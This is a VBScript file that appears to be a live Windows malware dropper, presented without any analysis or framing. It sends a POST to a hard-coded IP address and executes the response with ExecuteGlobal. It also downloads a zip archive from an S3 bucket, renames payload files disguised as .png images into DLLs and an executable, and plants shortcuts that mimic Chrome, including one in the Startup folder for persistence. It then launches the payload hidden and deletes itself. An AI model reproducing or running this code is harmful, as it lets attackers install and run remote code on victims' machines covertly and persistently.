On Error Resume Next
DIM vms
Set vms = CreateObject("Scripting.FileSystemObject")
If (vms.FileExists("C:\Users\Public\i.dat")) Then
	discardScript()
  WScript.Quit()
Else
Function m8skjsmsn(sUrl, sRequest)
  set M_sfs99s = CreateObject(StrReverse("ptthlmx.tf"&"osorcim"))
  M_sfs99s.open "POST", sUrl,false
  M_sfs99s.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
  M_sfs99s.setRequestHeader "Content-Length", Len(sRequest)
  M_sfs99s.send sRequest
  m8skjsmsn = M_sfs99s.responseText
End Function
Dim pixixito1,pixixito2,pixixito3,pixixito4
Function RandomString( ByVal strLen )
    Dim str, min, max
    Const LETTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJLMNKYWOPQRSTUVXZ"
    min = 1
    max = Len(LETTERS)
    Randomize
    For i = 1 to strLen
        str = str & Mid( LETTERS, Int((max-min+1)*Rnd+min), 1 )
    Next
    RandomString = str
End Function
Function Randominterger( ByVal strLen )
    Dim str, min, max
    Const LETTERS = "1234567890"
    min = 1
    max = Len(LETTERS)
    Randomize
    For i = 1 to strLen
        str = str & Mid( LETTERS, Int((max-min+1)*Rnd+min), 1 )
    Next
    Randominterger = str
End Function
dim variavel8,variavel9,ZipFile,ExtractTo,variavel2,xilique,gtuserprofile,fso, MyFile,runvbs,xbits,runbb
gtuserprofile = "c:\users\public\" 
xilique = RandomString(3) &"_"& Randominterger(3)
runvbs = gtuserprofile & xilique &".vbs"
set variavel32x = wScript.createObject("WScript.Shell")
variavel32 = variavel32x.expandEnvironmentStrings("%programfiles%")
  set variavel64x = wScript.createObject("WScript.Shell")
variavel64 = variavel32x.expandEnvironmentStrings("%programfiles(x86)%")
  DIM fsoyx2
Set fsoyx2 = CreateObject("Scripting.FileSystemObject")
If (fsoyx2.FileExists(variavel32 & "\Google\Chrome\Application\chrome.exe")) Then
  xbits =  variavel32 & "\Google\Chrome\Application\Chrome.exe, 0"
End If
If (fsoyx2.FileExists(variavel64 & "\Google\Chrome\Application\chrome.exe")) Then
  xbits =  variavel64 & "\Google\Chrome\Application\Chrome.exe, 0"
End If
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\Users\Public\Chrome.LNK"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = """" & runvbs & """"
olink.Description = "Acessar a internet."
oLink.IconLocation = xbits
oLink.WorkingDirectory = "C:\Users\Public\Chrome.LNK"
oLink.Save
set gtx1a = wScript.createObject("WScript.Shell")
gtappdata = gtx1a.expandEnvironmentStrings("%appdata%") & "\Microsoft\Windows\Start Menu\Programs\Startup\"
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = gtappdata & xilique & ".LNK"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = """" & gtuserprofile & xilique &"/"& xilique &".exe" & """"
oLink.IconLocation = xbits
oLink.WorkingDirectory = gtuserprofile & xilique 
oLink.Save
variavel2 = gtuserprofile & xilique
ExtractTo = gtuserprofile & xilique
Set fso = CreateObject("Scripting.FileSystemObject")
If NOT fso.FolderExists(ExtractTo) Then
   fso.CreateFolder(ExtractTo)
End If
xsUrl = "http://35.180.0.53/pz/HNEdhknsW.txt"
variavel2 = gtuserprofile & xilique
xsRequest = variavel2
zzz = m8skjsmsn(xsUrl, xsRequest)
xxx = zzz
Sub Includex
ExecuteGlobal xxx
End Sub
Includex
variavel8 = "https://s3-sa-east-1.amazonaws.com/06112018new/pz/md.zip"
variavel9 = gtuserprofile  & "md.zip"
MySub variavel8,variavel9
ZipFile = variavel9
ExtractTo = variavel2
Set fso = CreateObject("Scripting.FileSystemObject")
If NOT fso.FolderExists(ExtractTo) Then
   fso.CreateFolder(ExtractTo)
End If
set objShell = CreateObject("Shell.Application")
set FilesInZip=objShell.NameSpace(ZipFile).items
objShell.NameSpace(ExtractTo).CopyHere(FilesInZip)
Set fso = Nothing
Set objShell = Nothing
Dim gru
Set gru = WScript.CreateObject("Scripting.FileSystemObject")
gru.MoveFile variavel2 &"\msv.png", variavel2 &"\msvcr100.dll"
gru.MoveFile variavel2 &"\pp.png", variavel2 &"\jli.dll"
gru.MoveFile variavel2 &"\exe.png", variavel2 &"\" & xilique & ".exe"
Set fso = CreateObject("Scripting.FileSystemObject")
Set MyFile = fso.CreateTextFile(gtuserprofile &"i.dat", True)
MyFile.WriteLine(xilique)
MyFile.Close
set objshell = createobject("wscript.shell") 
objshell.run variavel2 &"\" & xilique & ".exe",vbhide
End If
Function discardScript()
        Set objFSO = CreateObject("Scripting.FileSystemObject")
        strScript = Wscript.ScriptFullName
        objFSO.DeleteFile(strScript)
    End Function
	discardScript()

